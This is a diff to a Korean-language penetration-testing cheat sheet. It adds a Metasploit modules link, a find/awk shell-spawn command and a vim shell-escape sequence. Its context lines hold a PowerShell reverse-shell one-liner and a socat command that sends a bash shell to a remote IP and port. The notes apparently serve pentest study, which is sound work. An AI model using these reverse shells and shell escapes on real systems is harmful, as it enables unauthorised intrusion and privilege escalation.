@@ -39,8 +39,8 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1
 
 ### Search Exploit
 ```searchsploit 50064.rd```<br/>
-경로 출력) ```searchsploit -p 50064.rd```
-
+경로 출력) ```searchsploit -p 50064.rd```<br/>
+- Rapid 7이 [github의 리포지토리](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits) 참고
 
 ### Payload 생성 Resource
 | **Resource**                            | **설명**                                                                                                                                                                                      |
@@ -68,8 +68,14 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```ruby: exec "/bin/sh"```<br/>
 ```lua: os.execute('/bin/sh')```<br/>
 ```awk 'BEGIN {system("/bin/sh")}'```<br/>
+```find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;```<br/>
 ```find . -exec /bin/sh \; -quit```<br/>
-```vim -c ':!/bin/sh'```
+```vim -c ':!/bin/sh'```<br/>
+```
+vim
+:set shell=/bin/sh
+:shell
+```
 
 ### sudo 권한 확인
 ```sudo -l```
